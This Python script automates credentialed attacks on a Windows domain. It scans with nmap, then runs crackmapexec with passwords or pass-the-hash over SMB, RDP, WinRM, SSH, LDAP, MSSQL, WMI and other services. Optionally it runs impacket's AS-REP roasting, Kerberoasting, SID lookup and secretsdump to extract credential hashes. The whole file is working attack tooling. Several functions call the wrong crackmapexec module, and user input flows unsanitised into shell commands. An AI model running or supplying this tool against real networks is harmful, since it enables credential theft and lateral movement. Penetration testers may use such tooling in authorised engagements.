#!/usr/bin/env python3 

#Script used to run crackmapexec and impacket when you already have a username and password to attack a domain, will not autoexploit anything
#Impacket will only be ran if RHOST is used
#User either RHOST or Network or File, do not try to run with more than one at a time
#if domain name is unknown run script and it will show you the domain name

import os
import argparse
import sys
import time
import subprocess
from subprocess import Popen
try:
    from colorama import Fore
except ImportError:
    os.system("pip3 install colorama")
    os.system("pip install colorama")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
RESET = Fore.RESET

parser = argparse.ArgumentParser(description="Crackmapexec", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-r", "--RHOST", action="store", help="RHOST, -r 10.10.10.1 ; ex: 10.10.10.0/24")
parser.add_argument("-u", "--USERNAME", action="store", help="Username")
parser.add_argument("-p", "--PASSWORD", action="store", help="Password")
parser.add_argument("-d", "--DOMAIN", action="store", help="Domain Name")
parser.add_argument("-H", "--HASH", action="store", help="NT hashes")
parser.add_argument("-F", "--FILE", action="store", help="IP address file ex: internal.txt (Do not use with file)")
parser.add_argument("-I", "--IMPACKET", action="store_true", help="Run Impacket against target, works best if you know you are an administrator")
parser.add_argument("-Z", "--PWN3D", action="store", help="Use if you have changed your cme.conf file to show something different than Pwn3d!, ex: -Z Shell! or -Z Admin!")
args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

RHOST = args.RHOST
DOMAIN = args.DOMAIN
USERNAME = args.USERNAME
PASSWORD = args.PASSWORD
HASH = args.HASH
FILE = args.FILE
IMP = args.IMPACKET
Z = args.PWN3D 

c = "crackmapexec"
cs = f"{c} smb"
cw = f"{c} winrm"
ch = f"{c} ssh"
cl = f"{c} ldap"
cm = f"{c} mssql"
cr = f"{c} rdp"
cwm = f"{c} wmi"
cv = f"{c} vnc"
cf = f"{c} ftp"
crup = f"{RHOST or FILE} -u {USERNAME} -p {PASSWORD}"
cruh = f"{RHOST or FILE} -u {USERNAME} -H {HASH}"
smbarg = "--shares --groups --users --sessions --computers --pass-pol"
i = f"{DOMAIN}/{USERNAME}:{PASSWORD}@{RHOST}"
ih = f"{DOMAIN}/{USERNAME}@{RHOST} --hashes {HASH}"
inp = f"impacket-GetNPUsers {i}"
inph = f"impacket-GetNPUsers {ih}"
ispn = f"impacket-GetUserSPNs {i}"
ispnh = f"impacket-GetUserSPNs {ih}"
isid = f"impacket-lookupsid {i}"
isidh = f"impacket-lookupsid {ih}"
isec = f"impacket-secretsdump {i}"
isech = f"impacket-secretsdump {ih}"

print(f"{RED}\n****REMEMBER TO RUN WITH DOMAIN NAME IF YOU ARE USING A DOMAIN USER****\n{RESET}")
time.sleep(3)

def NMAPR():
    print(f"{YELLOW}Running NMAP against target to not waste your time{RESET}\n")
    subprocess.call([f"nmap -p 445,22,21,3389,5985,636,1433,5600,135 -open -Pn {RHOST} > ports.txt"], shell=True)
    with open ("ports.txt", "r") as f:
        content = f.read()
        print(content)
def NMAPF():
    print(f"{YELLOW}Running NMAP against target to not waste your time{RESET}\n")
    subprocess.call([f"nmap -p 445,22,21,3389,5985,636,1433,5600,135 -open -Pn -iL {FILE} > ports.txt"], shell=True)
    with open ("ports.txt", "r") as f:
        content = f.read()
        print(content)

def SMBUP():
    t = "SMB.txt"
    with open ("ports.txt", "r") as f:
        word = "445"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against SMB, saving to {t}{RESET}")
            print(f"{GREEN}\n Finding the following for domain user --shares --groups --users --sessions --computers --pass-pol{RESET}")
            s = Popen([f"{cs} {crup} {smbarg} >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\n Finding the following for local authentication --shares --groups --users --sessions --computers --pass-pol {RESET}")
            s = Popen([f"{cs} {crup} {smbarg} --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"{Z} on SMB")

def RDPUP():
    t = "RDP.txt"
    with open ("ports.txt", "r") as f:
        word = "3389"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against RDP, saving to {t}{RESET}")
            s = Popen([f"{cr} {crup} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on RDP{RESET}")
def WINRMUP():
    t = "WINRM.txt"
    with open ("ports.txt", "r") as f:
        word = "5985"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against WINRM, saving to {t}{RESET}")
            s = Popen([f"{cw} {crup} >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\nRunning against WINRM with local authentication, saving to {t}{RESET}")
            s = Popen([f"{cw} {crup} >> {t}"], shell=True)
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on WINRM{RESET}")
def SSHUP():
    t = "SSH.txt"
    with open ("ports.txt", "r") as f:
        word = "22"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against SSH, saving to {t}{RESET}")
            s = Popen([f"{ch} {crup} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on SSH{RESET}")
def LDAPUP():
    t = "LDAP.txt"
    with open ("ports.txt", "r") as f:
        word = "636"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against LDAP and checking delegation, password not required and more, saving to {t}{RESET}")
            s = Popen([f"{cl} {crup} --trusted-for-delegation --password-not-required  >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\nRunning against LDAP and checking delegation, password not required and more, with local authentication saving to {t}{RESET}")
            s = Popen([f"{cl} {crup} --trusted-for-delegation --password-not-required --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on LDAP{RESET}")
def MSSQLUP():
    t = "MSSQL.txt"
    with open ("ports.txt", "r") as f:
        word = "1433"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against MSSQL, saving to {t}{RESET}")
            s = Popen([f"{cm} {crup} >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\nRunning against MSSQL with local authentication, saving to {t}{RESET}")
            s = Popen([f"{cm} {crup} --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on MSSQL{RESET}")
def WMIUP():
    t = "WMI.txt"
    with open ("ports.txt", "r") as f:
        word = "135"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against WMI, saving to {t}{RESET}")
            s = Popen([f"{cwm} {crup} >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\nRunning against WMI with local authentication, saving to {t}{RESET}")
            s = Popen([f"{cwm} {crup} --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on WMI{RESET}")
def VNCUP():
    t = "VNC.txt"
    with open ("ports.txt", "r") as f:
        word = "5600"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against VNC, saving to {t}{RESET}")
            s = Popen([f"{cm} {crup} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on VNC{RESET}")
def FTPUP():
    t = "FTP.txt"
    with open ("ports.txt", "r") as f:
        word = "21"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against FTP, saving to {t}{RESET}")
            s = Popen([f"{cm} {crup} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on FTP{RESET}")
################################################################HASH############################################################################################################

def SMBH():
    t = "SMB.txt"
    with open ("ports.txt", "r") as f:
        word = "445"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against SMB, saving to {t}{RESET}")
            print(f"{GREEN}\n Finding the following for domain user --shares --groups --users --sessions --computers --pass-pol{RESET}")
            s = Popen([f"{cs} {cruh} {smbarg} >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\n Finding the following for local authentication --shares --groups --users --sessions --computers --pass-pol {RESET}")
            s = Popen([f"{cs} {cruh} {smbarg} --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"{Z} on SMB")
def RDPH():
    t = "RDP.txt"
    with open ("ports.txt", "r") as f:
        word = "3389"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against RDP, saving to {t}{RESET}")
            s = Popen([f"{cr} {cruh} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on RDP{RESET}")
def WINRMH():
    t = "WINRM.txt"
    with open ("ports.txt", "r") as f:
        word = "5985"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against WINRM, saving to {t}{RESET}")
            s = Popen([f"{cw} {cruh} >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\nRunning against WINRM with local authentication, saving to {t}{RESET}")
            s = Popen([f"{cw} {cruh} >> {t}"], shell=True)
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on WINRM{RESET}")
def SSHH():
    t = "SSH.txt"
    with open ("ports.txt", "r") as f:
        word = "22"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against SSH, saving to {t}{RESET}")
            s = Popen([f"{ch} {cruh} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on SSH{RESET}")
def LDAPH():
    t = "LDAP.txt"
    with open ("ports.txt", "r") as f:
        word = "636"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against LDAP and checking delegation, password not required and more, saving to {t}{RESET}")
            s = Popen([f"{cl} {cruh} --trusted-for-delegation --password-not-required  >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\nRunning against LDAP and checking delegation, password not required and more, with local authentication saving to {t}{RESET}")
            s = Popen([f"{cl} {cruh} --trusted-for-delegation --password-not-required --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on LDAP{RESET}")
def MSSQLH():
    t = "MSSQL.txt"
    with open ("ports.txt", "r") as f:
        word = "1433"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against MSSQL, saving to {t}{RESET}")
            s = Popen([f"{cm} {cruh} >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\nRunning against MSSQL with local authentication, saving to {t}{RESET}")
            s = Popen([f"{cm} {cruh} --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on MSSQL{RESET}")
def WMIH():
    t = "WMI.txt"
    with open ("ports.txt", "r") as f:
        word = "135"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against WMI, saving to {t}{RESET}")
            s = Popen([f"{cwm} {cruh} >> {t}"], shell=True)
            s.wait()
            print(f"{YELLOW}\nRunning against WMI with local authentication, saving to {t}{RESET}")
            s = Popen([f"{cwm} {cruh} --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on WMI{RESET}")
def VNCH():
    t = "VNC.txt"
    with open ("ports.txt", "r") as f:
        word = "5600"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against VNC, saving to {t}{RESET}")
            s = Popen([f"{cm} {cruh} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on VNC{RESET}")
def FTPH():
    t = "FTP.txt"
    with open ("ports.txt", "r") as f:
        word = "21"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against FTP, saving to {t}{RESET}")
            s = Popen([f"{cm} {cruh} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on FTP{RESET}")

#################################################################IMPACKET#####################################################################

def IMPACKETADUP():
    t = "Impacket.txt"
    print(f"\n{YELLOW}Running Impacket GetNPUsers on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{inp} >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket GetUserSPNs on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{ispn} -request >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket SID on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{isid} >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket Secretsdump on target, saving to secrets.txt{RESET}")
    s = Popen([f"{isec} >> secrets.txt"], shell=True)
    s.wait()
    with open ("Impacket.txt", "r") as f:
        content = f.read()
        print(content)
    if os.stat("secrets.txt") != 0:
        with open ("secrets.txt", "r") as f:
            content = f.read()
            print(content)
def IMPACKETADH():
    t = "Impacket.txt"
    print(f"\n{YELLOW}Running Impacket GetNPUsers on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{inph} >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket GetUserSPNs on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{ispnh} -request >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket SID on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{isidh} >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket Secretsdump on target, saving to secrets.txt{RESET}")
    s = Popen([f"{isech} >> {t}"], shell=True)
    s.wait()
    with open ("Impacket.txt", "r") as f:
        content = f.read()
        print(content)
    with open ("secrets.txt", "r") as f:
        content = f.read()
        print(content)
def SMBSTAT():
    with open ("SMB.txt", "r") as f:
        word = "STATUS_PASSWORD_MUST_CHANGE"
        content = f.read()
        if word in content:
            print(f"{RED}\nUser has STATUS_PASSWORD_MUST_CHANGE{RESET}")
            s = Popen([f"cat SMB.txt | grep STATUS_PASSWORD_MUST_CHANGE"], shell=True)
            s.wait()
def REMINDER():
    print(f"{MAGENTA}\nReminder you have {RED}{Z}{RESET}{MAGENTA} on the following (if any){RED}\n")
    s = Popen([f"cat *.txt | grep {Z}"], shell=True)
    s.wait()
    print(f"{RESET}")

if FILE != None:
    NMAPF()
if RHOST != None:
    NMAPR()
if PASSWORD != None:
    SMBUP()
    RDPUP()
    WINRMUP()
    SSHUP()
    LDAPUP()
    MSSQLUP()
    WMIUP()
    VNCUP()
    SMBSTAT()
    REMINDER()
if HASH != None:
    SMBH()
    RDPH()
    WINRMH()
    SSHH()
    LDAPH()
    MSSQLH()
    WMIH()
    VNCH()
    SMBSTAT()
    REMINDER()
if IMP is not False and DOMAIN != None:
    input("Put domain name in /etc/hosts, press enter to continue")
    if PASSWORD != None:
        IMPACKETADUP()
    if HASH != None:
        IMPACKETADH()
